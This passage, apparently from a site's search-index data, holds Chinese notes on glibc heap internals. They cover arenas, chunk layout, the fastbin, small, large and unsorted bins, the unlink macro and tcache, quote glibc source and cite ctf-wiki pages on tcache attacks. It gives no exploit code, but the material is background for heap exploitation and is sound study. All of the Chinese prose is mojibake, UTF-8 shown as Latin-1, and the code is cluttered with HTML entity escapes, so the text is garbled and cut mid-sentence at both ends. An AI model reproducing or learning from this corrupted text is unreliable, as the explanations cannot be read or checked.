†çš„å®ç°é‡ç‚¹å…³æ³¨å†…å­˜å—çš„ç»„ç»‡å’Œç®¡ç†æ–¹å¼ï¼ˆå°¤å…¶æ—¶ç©ºé—²çš„å†…å­˜å—ï¼‰ï¼š  å¦‚ä½•æé«˜åˆ†é…å’Œé‡Šæ”¾çš„æ—¶é—´æ•ˆç‡ï¼› å¦‚ä½•é™ä½ç¢ç‰‡åŒ–ï¼Œæé«˜ç©ºé—´åˆ©ç”¨ç‡ï¼›    å¸¸è§å †çš„å®ç°ï¼š\n dlmallocï¼šé€šç”¨åˆ†é…å™¨ï¼› ptmalloc2ï¼šglibc å‡½æ•°ï¼ŒåŸºäº dlmallocï¼Œæ”¯æŒå¤šçº¿ç¨‹ï¼› jemallocï¼šFreeBSDã€FireFoxã€Androidï¼›å†…å­˜å ç”¨æ›´é«˜ï¼Œä½†æ˜¯åœ¨å¤šæ ¸å¤šçº¿ç¨‹ä¸‹çš„è¡¨ç°ä¹Ÿæœ€ä¸ºä¼˜å¼‚ã€‚ tcmallocï¼šGoogle Chromeã€Golangï¼›é’ˆå¯¹å¤šæ ¸æƒ…å†µæœ‰æ‰€ä¼˜åŒ–ï¼Œæ€§èƒ½æœ‰æ‰€æé«˜ï¼Œä½†æ˜¯å†…å­˜å ç”¨ç¨é«˜ï¼Œå¤§å†…å­˜åˆ†é…å®¹æ˜“å‡ºç° CPU é£™å‡ã€‚ libumemï¼šSolarisï¼› Windows 10ï¼šsegment heapã€‚   ç›¸å…³èµ„æ–™ï¼š\n https://www.cyningsun.com/07-07-2018/memory-allocator-contrasts.html#%E7%B3%BB%E7%BB%9F%E5%90%91%E7%9C%8Bptmalloc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86   glibc heap #  ç›¸å…³ç»“æ„ #  ä¸‹é¢ä»‹ç»ç®¡ç† glic å †çš„å„ç§æ•°æ®ç»“æ„ï¼š\narena #  arena æŒ‡çš„æ˜¯å†…å­˜åŒºåŸŸæœ¬èº«ï¼Œå¹¶éä¸€ä¸ªç»“æ„ï¼š\n ä¸»çº¿ç¨‹çš„å †ç”± sbrk åˆ›å»ºï¼Œç§°ä¸º main arenaï¼› å…¶ä»–çº¿ç¨‹çš„å †ç”± mmap åˆ›å»ºï¼Œç§°ä¸º per thread arenaï¼›  arena çš„æ•°é‡å— CPU æ ¸æ•°çš„é™åˆ¶ï¼š\n å¯¹äº 32 ä½ç³»ç»Ÿï¼šæ•°é‡ä¸Šé™ = 2 * æ ¸æ•° å¯¹äº 64 ä½ç³»ç»Ÿï¼šæ•°é‡ä¸Šé™ = 8 * æ ¸æ•°  malloc_state #  å®ƒæ˜¯ç®¡ç† arena çš„æ ¸å¿ƒç»“æ„ï¼Œå…¶å®šä¹‰åœ¨ glibc æºç çš„ /malloc/malloc.c è¿™ä¸ªæ–‡ä»¶ä¸­ï¼š\nstruct malloc_state {  /* Serialize access. */  __libc_lock_define (, mutex);   /* Flags (formerly in max_fast). */  int flags;   /* Set if the fastbin chunks contain recently inserted free blocks. */  /* Note this is a bool but not all targets support atomics on booleans. */  int have_fastchunks;   /* Fastbins */  mfastbinptr fastbinsY[NFASTBINS];   /* Base of the topmost chunk -- not otherwise kept in a bin */  mchunkptr top;   /* The remainder from the most recent split of a small request */  mchunkptr last_remainder;   /* Normal bins packed as described above */  mchunkptr bins[NBINS * 2 - 2];   /* Bitmap of bins */  unsigned int binmap[BINMAPSIZE];   /* Linked list */  struct malloc_state *next;   /* Linked list for free arenas. Access to this field is serialized by free_list_lock in arena.c. */  struct malloc_state *next_free;   /* Number of threads attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */  INTERNAL_SIZE_T attached_threads;   /* Memory allocated from the system in this arena. */  INTERNAL_SIZE_T system_mem;  INTERNAL_SIZE_T max_system_mem; }; åŒæ ·åœ¨æ–‡ä»¶ /malloc/malloc.c ä¸­ï¼Œå®šä¹‰äº†å…¨å±€å˜é‡ main_arena ç®¡ç†ä¸»çº¿ç¨‹çš„ malloc_stateï¼š\nstatic struct malloc_state main_arena = {  .mutex = _LIBC_LOCK_INITIALIZER,  .next = \u0026amp;main_arena,  .attached_threads = 1 }; malloc_chunks #  å†…å­˜å—çš„ç»“æ„ï¼Œglibc æºç çš„ ./malloc/malloc.c è¿™ä¸ªæ–‡ä»¶ä¸­å®šä¹‰ï¼š\nstruct malloc_chunk {   INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free). */  INTERNAL_SIZE_T mchunk_size; /* Size in bytes, including overhead. */   struct malloc_chunk* fd; /* double links -- used only if free. */  struct malloc_chunk* bk;   /* Only used for large blocks: pointer to next larger size. */  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */  struct malloc_chunk* bk_nextsize; }; ç©ºé—²å†…å­˜å—çš„ç»“æ„å¤§è‡´å¦‚ä¸‹ï¼ˆå­—æ®µå³ä¾§ä¸º32 ä½å¹³å°ä¸‹çš„æ¯”ç‰¹ä½é•¿ï¼‰ï¼š\n ç¬¬ä¸€ä¸ªå­—æ®µ prev_size å­˜å‚¨äº†ï¼Œç‰©ç†åœ°å€ä¸Šçš„å‰ä¸€ä¸ª chunk çš„å¤§å°ã€‚ ç¬¬äºŒä¸ªå­—æ®µ size è®°å½•äº†å½“å‰ chunk çš„å¤§å°ã€‚æœ€åä¸‰ä¸ªæ¯”ç‰¹ä½è¢«ç”¨ä½œå…¶ä»–å«ä¹‰ï¼š  P ä»£è¡¨ PREV_INUSEï¼ŒæŒ‡æ˜å‰ä¸€ä¸ª chunk æ˜¯å¦è¢«ä½¿ç”¨ï¼› M ä»£è¡¨ IS_MAPPEDï¼Œä»£è¡¨å½“å‰çš„ chunk æ˜¯å¦é€šè¿‡ mmap æ–¹å¼åˆ›å»ºå‡ºæ¥çš„ï¼› N ä»£è¡¨ NON_MAIN_ARENAï¼Œä»£è¡¨å½“å‰ chunk æ˜¯å¦å±äºå…¶ä»–çº¿ç¨‹å †ï¼ˆä¸»çº¿ç¨‹å€¼ä¸º 0ï¼‰ï¼›   ç¬¬ä¸‰å››ä¸ªå­—æ®µä¸ºå‰å‘æŒ‡é’ˆä¸åå‘æŒ‡é’ˆï¼Œè¿™ä¸¤ä¸ªå­—æ®µç”¨äº bin é“¾è¡¨ä¸­ã€‚  å·²åˆ†é…å†…å­˜å—çš„ç»“æ„å¤§è‡´å¦‚ä¸‹ï¼š\n  å‰ä¸¤ä¸ªå­—æ®µä¸ç©ºé—²çš„å†…å­˜å—å¤§è‡´ç›¸åŒï¼›\n  ç”¨æˆ·å¯ç”¨çš„æ•°æ®æ˜¯ç¬¬ä¸‰ä¸ªå­—æ®µå¼€å§‹ä¸€ç›´åˆ°ä¸‹ä¸€ä¸ª chunk çš„ç¬¬ä¸€ä¸ªå­—æ®µã€‚è¿™æ˜¯å› ä¸ºï¼š\n prev_size åªæœ‰å½“å‰ä¸€ä¸ªå­—æ®µæ˜¯ç©ºé—²çš„æ—¶å€™æ‰æœ‰æ„ä¹‰ï¼Œå¦‚æœå‰ä¸€ä¸ªå­—æ®µå·²ç»åˆ†é…ï¼Œå †ç®¡ç†å™¨ä¸å…³å¿ƒï¼›  è¿™ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ 32 ä½ç¨‹åºä¸­ï¼Œå¦‚æœç”¨æˆ·ç”³è¯·äº† 16 ä¸ªå­—èŠ‚çš„ç©ºé—´ï¼Œå…¶å¯¹åº”çš„ chunk æ•°æ®ç»“æ„çš„ data æ®µåªä¼šæœ‰ 12 ä¸ªå­—èŠ‚ï¼Œç”¨æˆ·åŠ ä¸Šä¸‹ä¸€ä¸ª chunk çš„ prev_size ç©ºé—´ï¼Œä¸€å…±å¯ä»¥ä½¿ç”¨ 16 ä¸ªå­—èŠ‚ã€‚\nä½†æ˜¯ size è®°å½•çš„æ˜¯ prev_size èµ·å§‹åˆ°ä¸‹ä¸€ä¸ª prev_size èµ·å§‹ä¹‹é—´çš„å¤§å°ã€‚\n  åœ¨ 32 ä½å¹³å°ä¸‹ï¼Œchunk çš„å¤§å°ä¸€å®šæ˜¯ 8 å­—èŠ‚çš„æ•´æ•°å€ï¼ˆæ‰€ä»¥ size çš„æœ€ä½ä¸‰ä¸ªæ¯”ç‰¹ä½æ˜¯æ— ç”¨çš„ï¼‰ã€‚malloc è¿”å›åœ°å€æŒ‡é’ˆä¸º data çš„èµ·å§‹ä½ç½®ã€‚\n  fastbins #  bins æ˜¯æ ¹æ® chunk çš„å¤§å°å’ŒçŠ¶æ€ï¼Œç”¨æ¥ç®¡ç†å’Œç»„ç»‡ç©ºé—²å—çš„ï¼Œé“¾è¡¨çš„æ•°ç»„ç»“æ„ã€‚\nfastbins ç”¨äºç®¡ç†æœ€å°çš„ chunkã€‚ä»–å­˜å‚¨åœ¨äº† malloc_state ä¸­çš„æ•°ç»„å˜é‡ fastbinsY ä¸­ã€‚å®ƒåŒæ ·å®šä¹‰åœ¨ /malloc/malloc.c è¿™ä¸ªæ–‡ä»¶ä¸­ï¼š\n/* Fastbins An array of lists holding recently freed small chunks. Fastbins are not doubly linked. It is faster to single-link them, and since chunks are never removed from the middles of these lists, double linking is not necessary. Also, unlike regular bins, they are not even processed in FIFO order (they use faster LIFO) since ordering doesn\u0026#39;t much matter in the transient contexts in which fastbins are normally used. Chunks in fastbins keep their inuse bit set, so they cannot be consolidated with other free chunks. malloc_consolidate releases all chunks in fastbins and consolidates them with other free chunks. */  typedef struct malloc_chunk *mfastbinptr; #define fastbin(ar_ptr, idx) ((ar_ptr)-\u0026gt;fastbinsY[idx]) å¯ä»¥å¾—å‡ºå®ƒæœ‰ä»¥ä¸‹è¿™äº›ç‰¹ç‚¹ï¼š\n å®ƒæ˜¯ä¸€ä¸ªå•å‘é“¾è¡¨ï¼ˆå› ä¸ºä»æ¥ä¸ä¼šéœ€è¦ä»ä¸­é—´ç§»é™¤å…ƒç´ çš„æ“ä½œï¼Œä¸éœ€è¦åŒå‘é“¾è¡¨ï¼‰ï¼› åè¿›å…ˆå‡ºï¼ˆå…¶ä»–çš„åƒåœ¾å›æ”¶ç»“æ„æ˜¯å…ˆè¿›å…ˆå‡ºï¼‰ï¼› chunk è¢«æ¸…ç†æ—¶ï¼ŒPREV_INUSE æ ‡å¿—ä½ä¸ä¼šè¢«æ¸…é›¶ï¼› 32 ä½ç³»ç»Ÿä¸­ï¼Œfastbin ä¸­é»˜è®¤æ”¯æŒæœ€å¤§çš„ chunk çš„æ•°æ®ç©ºé—´å¤§å°ä¸º 64 å­—èŠ‚ã€‚ä½†æ˜¯ glibc å¯ä»¥æ”¯æŒçš„ chunk çš„æ•°æ®ç©ºé—´æœ€å¤§ä¸º 80 å­—èŠ‚ã€‚ ä¸€å…±æœ‰åä¸ª fastbinsï¼› ç›¸é‚»çš„ç©ºé—²çš„ fastbin chunk ä¸ä¼šè¢«åˆå¹¶ã€‚  ä¸‹é¢æ˜¯ä¸€ä¸ª 32 ä½ç¨‹åºåœ¨è¿è¡Œæ—¶çš„ fastbins ç¤ºä¾‹å›¾ï¼š\nbins (small \u0026amp; large \u0026amp; unsorted) #  æºç ä¸­æœ‰ä¸€æ®µæ³¨é‡Šè§£é‡Šè¿™äº› binsï¼š\n/* Bins An array of bin headers for free chunks. Each bin is doubly linked. The bins are approximately proportionally (log) spaced. There are a lot of these bins (128). This may look excessive, but works very well in practice. Most bins hold sizes that are unusual as malloc request sizes, but are more usual for fragments and consolidated sets of chunks, which is what these bins hold, so they can be found quickly. All procedures maintain the invariant that no consolidated chunk physically borders another one, so each chunk in a list is known to be preceeded and followed by either inuse chunks or the ends of memory. Chunks in bins are kept in size order, with ties going to the approximately least recently used chunk. Ordering isn\u0026#39;t needed for the small bins, which all contain the same-sized chunks, but facilitates best-fit allocation for larger chunks. These lists are just sequential. Keeping them in order almost never requires enough traversal to warrant using fancier ordered data structures. Chunks of the same size are linked with the most recently freed at the front, and allocations are taken from the back. This results in LRU (FIFO) allocation order, which tends to give each chunk an equal opportunity to be consolidated with adjacent freed chunks, resulting in larger free chunks and less fragmentation. To simplify use in double-linked lists, each bin header acts as a malloc_chunk. This avoids special-casing for headers. But to conserve space and improve locality, we allocate only the fd/bk pointers of bins, and then use repositioning tricks to treat these as the fields of a malloc_chunk*. */ å…¶ä¸­ small bins æœ‰ä»¥ä¸‹çš„ç‰¹ç‚¹ï¼š\n chunk çš„å¤§å°å°äº 512 å­—èŠ‚ï¼› å…±æœ‰ 62 ä¸ªåŒå‘å¾ªç¯é“¾è¡¨ï¼Œæ¯ä¸ªé“¾è¡¨ä¸­å­˜å‚¨ç€ç›¸åŒå¤§å°çš„ chunkï¼› å…ˆè¿›å…ˆå‡ºï¼› å½“æœ‰ç›¸é‚»çš„ç©ºé—²å†…å­˜å—æ—¶ï¼Œchunk ä¼šè¢«åˆå¹¶æˆä¸€ä¸ªæ›´å¤§çš„ chunkã€‚  large bins æœ‰ä»¥ä¸‹çš„ç‰¹ç‚¹ï¼š\n chunk çš„å¤§å°å¤§äº 512 å­—èŠ‚ï¼› å…±æœ‰ 63 ä¸ªåŒå‘å¾ªç¯é“¾è¡¨ï¼Œå¤§å°ç›¸è¿‘çš„ chunk æ”¾åœ¨åŒä¸€ä¸ª bin ä¸­ï¼› chunk æŒ‰ç…§å¤§å°ä»å¤§åˆ°å°æ’åºï¼› å…ˆè¿›å…ˆå‡ºï¼› å½“æœ‰ç›¸é‚»çš„ç©ºé—²å†…å­˜å—æ—¶ï¼Œchunk ä¼šè¢«åˆå¹¶æˆä¸€ä¸ªæ›´å¤§çš„ chunkã€‚  unsorted bins æœ‰ä»¥ä¸‹çš„ç‰¹ç‚¹ï¼š\n chunk çš„å¤§å°å¤§äº 64 ä¸ªå­—èŠ‚ï¼› åªæœ‰å”¯ä¸€ä¸€ä¸ªåŒå‘å¾ªç¯é“¾è¡¨ï¼› å½“ä¸€ä¸ªé fastbin çš„ chunk è¢«é‡Šæ”¾ä¹‹åï¼Œå®ƒé¦–å…ˆè¢«æ”¾å…¥ unsorted bin ç­‰åç»­æ•´ç†æ—¶ï¼Œæ‰ä¼šæ”¾å…¥å¯¹åº”çš„ small bin/fast binã€‚  è¿™ä¸‰ä¸ª bins å…±äº«ä¸€ä¸ª malloc_state ä¸­çš„å˜é‡ï¼š\n/* Normal bins packed as described above */  mchunkptr bins[NBINS * 2 - 2]; å…¶ä¸­ä¸‰ç§ bins çš„æ’åˆ—å¤§è‡´å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\nç›¸å…³å‡½æ•° #  malloc() #  å·¥ä½œæµç¨‹ï¼š\n åœ¨ fast bins ä¸­å¯»æ‰¾ fast chunkï¼Œå¦‚æœæ‰¾åˆ°åˆ™ç»“æŸï¼› åœ¨ small bins ä¸­å¯»æ‰¾ small chunkï¼Œå¦‚æœæ‰¾åˆ°åˆ™ç»“æŸï¼› å¾ªç¯ï¼š  æ£€æŸ¥ unsorted bin ä¸­çš„ last_remainderã€‚å¦‚æœå®ƒè¶³å¤Ÿå¤§å¤§åˆ™åˆ†é…è¿™ä¸ª chunkï¼Œå¹¶å°†å‰©ä½™çš„ chunk æ ‡è®°ä¸ºæ–°çš„ last_remainerï¼› åœ¨ unsorted bin ä¸­æœç´¢ï¼ŒåŒæ—¶è¿›è¡Œæ•´ç†ã€‚å¦‚æœé‡åˆ°ç²¾ç¡®å¤§å°åˆ™è¿”å›ï¼Œå¦åˆ™å°† chunk æ•´ç†åˆ°å®ƒå¯¹åº”å¤§å°çš„ small/large bins ä¸­å»ï¼› åœ¨ small bin å’Œ large bin ä¸­æœç´¢æœ€åˆé€‚çš„ chunkï¼ˆä¸ä¸€å®šç²¾ç¡®ï¼‰ï¼›   ä½¿ç”¨ top chunkã€‚  free() #  å·¥ä½œæµç¨‹ï¼š\n å¦‚æœæ˜¯ fast chunkï¼Œåˆ™æ”¾å…¥ fast binï¼› å¦‚æœå‰ä¸€ä¸ª chunk æ˜¯ç©ºé—²çš„ï¼š  unlink å‰é¢çš„ chunkï¼› åˆå¹¶ä¸¤ä¸ª chunkï¼Œå¹¶ä¸”æ”¾å…¥ unsorted binï¼›   å¦‚æœåä¸€ä¸ª chunk æ˜¯ top chunkï¼Œåˆ™å°†å½“å‰ chunk å¹¶å…¥ top chunkï¼› å¦‚æœåä¸€ä¸ª chunk æ˜¯ç©ºé—²çš„ï¼š  unlink åé¢çš„ chunkï¼› åˆå¹¶ä¸¤ä¸ª chunkï¼Œå¹¶ä¸”æ”¾å…¥ unsorted binï¼›   å‰åä¸¤ä¸ª chunk éƒ½ä¸æ˜¯ç©ºé—²çš„ï¼Œç›´æ¥æ”¾å…¥ unsorted binï¼›  unlink() #  unlink å‡½æ•°ç”¨æ¥å°†åŒå‘é“¾è¡¨ä¸­çš„ä¸€ä¸ªå…ƒç´ å–å‡ºæ¥ï¼Œå®ƒæºç å¦‚ä¸‹ï¼š\n/* Take a chunk off a bin list */ // unlink p #define unlink(AV, P, BK, FD) { \\ // ç”±äº P å·²ç»åœ¨åŒå‘é“¾è¡¨ä¸­ï¼Œæ‰€ä»¥æœ‰ä¸¤ä¸ªåœ°æ–¹è®°å½•å…¶å¤§å°ï¼Œæ‰€ä»¥æ£€æŸ¥ä¸€ä¸‹å…¶å¤§å°æ˜¯å¦ä¸€è‡´ã€‚  if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \\  malloc_printerr (\u0026#34;corrupted size vs. prev_size\u0026#34;); \\  FD = P-\u0026gt;fd; \\  BK = P-\u0026gt;bk; \\  // é˜²æ­¢æ”»å‡»è€…ç®€å•ç¯¡æ”¹ç©ºé—²çš„ chunk çš„ fd ä¸ bk æ¥å®ç°ä»»æ„å†™çš„æ•ˆæœã€‚  if (__builtin_expect (FD-\u0026gt;bk != P || BK-\u0026gt;fd != P, 0)) \\  malloc_printerr (check_action, \u0026#34;corrupted double-linked list\u0026#34;, P, AV); \\  else { \\  FD-\u0026gt;bk = BK; \\  BK-\u0026gt;fd = FD; \\  // ä¸‹é¢ä¸»è¦è€ƒè™‘ P å¯¹åº”çš„ nextsize åŒå‘é“¾è¡¨çš„ä¿®æ”¹  if (!in_smallbin_range (chunksize_nomask (P)) \\  // å¦‚æœP-\u0026gt;fd_nextsizeä¸º NULLï¼Œè¡¨æ˜ P æœªæ’å…¥åˆ° nextsize é“¾è¡¨ä¸­ã€‚  // é‚£ä¹ˆå…¶å®ä¹Ÿå°±æ²¡æœ‰å¿…è¦å¯¹ nextsize å­—æ®µè¿›è¡Œä¿®æ”¹äº†ã€‚  // è¿™é‡Œæ²¡æœ‰å»åˆ¤æ–­ bk_nextsize å­—æ®µï¼Œå¯èƒ½ä¼šå‡ºé—®é¢˜ã€‚  \u0026amp;\u0026amp; __builtin_expect (P-\u0026gt;fd_nextsize != NULL, 0)) { \\  // ç±»ä¼¼äºå°çš„ chunk çš„æ£€æŸ¥æ€è·¯  if (__builtin_expect (P-\u0026gt;fd_nextsize-\u0026gt;bk_nextsize != P, 0) \\  || __builtin_expect (P-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize != P, 0)) \\  malloc_printerr (check_action, \\  \u0026#34;corrupted double-linked list (not small)\u0026#34;, \\  P, AV); \\  // è¿™é‡Œè¯´æ˜ P å·²ç»åœ¨ nextsize é“¾è¡¨ä¸­äº†ã€‚  // å¦‚æœ FD æ²¡æœ‰åœ¨ nextsize é“¾è¡¨ä¸­  if (FD-\u0026gt;fd_nextsize == NULL) { \\  // å¦‚æœ nextsize ä¸²èµ·æ¥çš„åŒé“¾è¡¨åªæœ‰ P æœ¬èº«ï¼Œé‚£å°±ç›´æ¥æ‹¿èµ° P  // ä»¤ FD ä¸º nextsize ä¸²èµ·æ¥çš„  if (P-\u0026gt;fd_nextsize == P) \\  FD-\u0026gt;fd_nextsize = FD-\u0026gt;bk_nextsize = FD; \\  else { \\  // å¦åˆ™æˆ‘ä»¬éœ€è¦å°† FD æ’å…¥åˆ° nextsize å½¢æˆçš„åŒé“¾è¡¨ä¸­  FD-\u0026gt;fd_nextsize = P-\u0026gt;fd_nextsize; \\  FD-\u0026gt;bk_nextsize = P-\u0026gt;bk_nextsize; \\  P-\u0026gt;fd_nextsize-\u0026gt;bk_nextsize = FD; \\  P-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = FD; \\  } \\  } else { \\  // å¦‚æœåœ¨çš„è¯ï¼Œç›´æ¥æ‹¿èµ°å³å¯  P-\u0026gt;fd_nextsize-\u0026gt;bk_nextsize = P-\u0026gt;bk_nextsize; \\  P-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = P-\u0026gt;fd_nextsize; \\  } \\  } \\  } \\ } å®ƒå¯èƒ½åœ¨ä»¥ä¸‹å‡½æ•°ä¸­è¢«è°ƒç”¨ï¼š\n  mallocï¼š\n  ä»æ°å¥½å¤§å°åˆé€‚çš„ large bin ä¸­è·å– chunkã€‚\n  è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ fastbin ä¸ small bin å°±æ²¡æœ‰ä½¿ç”¨ unlink\n  ä¾æ¬¡éå†å¤„ç† unsorted bin æ—¶ä¹Ÿæ²¡æœ‰ä½¿ç”¨ unlink çš„ã€‚\n    ä»æ¯”è¯·æ±‚çš„ chunk æ‰€åœ¨çš„ bin å¤§çš„ bin ä¸­å– chunkã€‚\n    freeï¼š\n åå‘åˆå¹¶ï¼Œåˆå¹¶ç‰©ç†ç›¸é‚»ä½åœ°å€ç©ºé—² chunkã€‚ å‰å‘åˆå¹¶ï¼Œåˆå¹¶ç‰©ç†ç›¸é‚»é«˜åœ°å€ç©ºé—² chunkï¼ˆé™¤äº† top chunkï¼‰ã€‚    malloc_consolidateï¼š\n åå‘åˆå¹¶ï¼Œåˆå¹¶ç‰©ç†ç›¸é‚»ä½åœ°å€ç©ºé—² chunkã€‚ å‰å‘åˆå¹¶ï¼Œåˆå¹¶ç‰©ç†ç›¸é‚»é«˜åœ°å€ç©ºé—² chunkï¼ˆé™¤äº† top chunkï¼‰ã€‚    reallocï¼š\n å‰å‘æ‰©å±•ï¼Œåˆå¹¶ç‰©ç†ç›¸é‚»é«˜åœ°å€ç©ºé—² chunkï¼ˆé™¤äº† top chunkï¼‰ã€‚    "},{"id":432,"href":"/docs/%E9%A1%B9%E7%9B%AE%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/linux%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/glibctcache/","title":"Glibc Tcache","section":"Linuxæºç é˜…è¯»","content":" å‚è€ƒèµ„æ–™ï¼š\n http://p4nda.top/2018/03/20/tcache/ https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/   Tcache #  ä»‹ç» #  tcacheï¼Œå…¨ç§°æ˜¯ thread local cachingï¼Œæ˜¯ libc 2.26 ç‰ˆæœ¬ä¸­æ–°å¢åŠ çš„å†…å­˜ç®¡ç†æœºåˆ¶ï¼Œå±äºä¸€ç§ç”¨äºåŠ é€Ÿ malloc åˆ†é…çš„ç¼“å­˜æœºåˆ¶ã€‚\nå®ƒç”± 64 ä¸ªé“¾è¡¨ç»„æˆï¼Œå¤„ç†é€»è¾‘ä½äº malloc å‡½æ•°å’Œ free å‡½æ•°ä¸­ï¼Œä¼˜å…ˆçº§è¾ƒé«˜ï¼Œä¼šå…ˆäºå…¨éƒ¨çš„ bin æ¥å¤„ç†ï¼Œå½“ç¼“å­˜é“¾è¡¨è£…æ»¡æ—¶ï¼Œåˆ†é…æ–¹å¼å°±ä¸ä¹‹å‰ç‰ˆæœ¬çš„ malloc ç›¸åŒã€‚\næºç åˆ†æ #  tcache_entry \u0026amp;\u0026amp; tcache_perthread_struct #  åœ¨ tcache ä¸­æ–°å¢äº†ä¸¤ä¸ªæ•°æ®ç»“æ„ï¼Œå®ƒä»¬çš„å®šä¹‰æºç å¦‚ä¸‹ï¼š\n/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache. */ typedef struct tcache_entry {  struct tcache_entry *next;  /* This field exists to detect double frees. */  struct tcache_perthread_struct *key; } tcache_entry;  /* There is one of these for each thread, which contains the per-thread cache (hence \u0026#34;tcache_perthread_struct\u0026#34;). Keeping overall size low is mildly important. Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons. */ typedef struct tcache_perthread_struct {  uint16_t counts[TCACHE_MAX_BINS];  tcache_entry *entries[TCACHE_MAX_BINS]; } tcache_perthread_struct;  static __thread bool tcache_shutting_down = false; static __thread tcache_perthread_struct *tcache = NULL; å¯è§æºç ä¸­ç›´æ¥å®šä¹‰äº†ä¸€ä¸ªåè€…çš„ä¸€ä¸ªå¯¹è±¡ tcacheï¼Œå‡è®¾å‰è€…æœ‰ä¸¤ä¸ªåƒåœ¾å¯¹è±¡ï¼Œå…¶å†…å­˜å¸ƒå±€å¤§è‡´å¦‚ä¸‹ï¼š\n tcache_perthread_struct *tcache | | v +---------------------------+---+ 2*64 | uint16_t counts[64] | 0 |\u0026lt;----------------------------------------------+\r+-------------------------------- |\r| 2 | |\r----- |\r|...| |\r----- |\r| 0 | |\r----- |\r| 0 | |\r+---------------------------+------+ |\r4*64 | tcache_entry *entries[64] | null | |\r+----------------------------------- +------------------------------+ |\r| ptr |----\u0026gt;| tcache_entry *next |-+ |\r-------- -------------------------------- | |\r| ... | | tcache_perthread_struct *key |-|-----+\r-------- +------------------------------+ | |\r| null | +-----------------------------------+ |\r-------- | +------------------------------+ |\r| null | +-\u0026gt;| tcache_entry *next |-\u0026gt;null |\r+------+ -------------------------------- |\r| tcache_perthread_struct *key |-------+\r+------------------------------+ tcache_get \u0026amp;\u0026amp; tcache_put #  ä¸¤ä¸ªæ¯”è¾ƒé‡è¦çš„å‡½æ•°ï¼Œtcache_get() ä¸ tcache_put()ï¼š\n/* Caller must ensure that we know tc_idx is valid and there\u0026#39;s room for more chunks. */ static __always_inline void tcache_put (mchunkptr chunk, size_t tc_idx) {  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);   /* Mark this chunk as \u0026#34;in the tcache\u0026#34; so the test in _int_free will detect a double free. */  e-\u0026gt;key = tcache;   e-\u0026gt;next = tcache-\u0026gt;entries[tc_idx];  tcache-\u0026gt;entries[tc_idx] = e;  ++(tcache-\u0026gt;counts[tc_idx]); }  /* Caller must ensure that we know tc_idx is valid and there\u0026#39;s available chunks to remove. */ static __always_inline void * tcache_get (size_t tc_idx) {  tcache_entry *e = tcache-\u0026gt;entries[tc_idx];  tcache-\u0026gt;entries[tc_idx] = e-\u0026gt;next;  --(tcache-\u0026gt;counts[tc_idx]);  e-\u0026gt;key = NULL;  return (void *) e; }  å‰è€…å°†ä¸€ä¸ªå…ƒç´ æ’å…¥äº†å•å‘é“¾è¡¨çš„å¤´éƒ¨ï¼Œå¹¶ä¸”å°†å¯¹åº”ä½ç½®çš„ counts å¤§å°è‡ªå¢ä¸€ï¼› åè€…å•å‘é“¾è¡¨å¤´éƒ¨èŠ‚ç‚¹å–å‡ºå¹¶è¿”å›ï¼Œå¹¶ä¸”å°†å¯¹åº”ä½ç½®çš„ counts å¤§å°è‡ªå‡ä¸€ã€‚  _int_free #  åœ¨å†…å­˜é‡Šæ”¾çš„ free å‡½æ•°ä¸­ï¼Œå¯¹ tcache çš„ç›¸å…³è°ƒç”¨åªæœ‰ä»¥ä¸‹çš„ä¸€å¤„ï¼Œè¯¥å¤„åœ¨å‡½æ•°çš„æœ€å¼€å§‹æ‰§è¡Œï¼š\n#if USE_TCACHE  {  size_t tc_idx = csize2tidx (size);  if (tcache != NULL \u0026amp;\u0026amp; tc_idx \u0026lt; mp_.tcache_bins)  { \t/* Check to see if it\u0026#39;s already in the tcache. */ \ttcache_entry *e = (tcache_entry *) chunk2mem (p);  \t/* This test succeeds on double free. However, we don\u0026#39;t 100% trust it (it also matches random payload data at a 1 in 2^\u0026lt;size_t\u0026gt; chance), so verify it\u0026#39;s not an unlikely coincidence before aborting. */ \tif (__glibc_unlikely (e-\u0026gt;key == tcache)) \t{ \ttcache_entry *tmp; \tLIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx); \tfor (tmp = tcache-\u0026gt;entries[tc_idx]; \ttmp; \ttmp = tmp-\u0026gt;next) \tif (tmp == e) \tmalloc_printerr (\u0026#34;free(): double free detected in tcache 2\u0026#34;); \t/* If we get here, it was a coincidence. We\u0026#39;ve wasted a few cycles, but don\u0026#39;t abort. */ \t}  \tif (tcache-\u0026gt;counts[tc_idx] \u0026lt; mp_.tcache_count) \t{ \ttcache_put (p, tc_idx); \treturn; \t}  }  } #endif å¯è§ï¼Œåœ¨æ‰§è¡Œ tcache_put æ“ä½œä¹‹å‰ï¼Œå‡½æ•°ä¸»è¦è¿›è¡Œäº†ä¸‰ä¸ªæ£€æµ‹ï¼š\n å½“å‰çš„ tcache å­˜åœ¨ï¼Œå¹¶ä¸”ç›®æ ‡å—çš„å¤§å°åœ¨èŒƒå›´å†…ï¼› ç›®æ ‡å—çš„ key æ˜¯å¦æŒ‡å‘äº† tcacheï¼Œè‹¥å·²ç»æŒ‡å‘äº†ç›®æ ‡åœ°å€ï¼Œåˆ™æœ‰å¯èƒ½æ˜¯ Double Freeï¼› ç›®æ ‡çš„åƒåœ¾ç®±é“¾è¡¨é•¿åº¦æ˜¯å¦å·²ç»è¾¾åˆ°ä¸Šé™ï¼ˆæºç ä¸­å°†ä¸Šé™å®šä¹‰ä¸º 7ï¼‰ã€‚  _int_malloc #  è€Œåœ¨å†…å­˜åˆ†é…çš„ malloc å‡½æ•°ä¸­ï¼Œå¯¹ tcache çš„è°ƒç”¨æœ‰äº”å¤„ï¼Œæ ¹æ® ctf-wiki 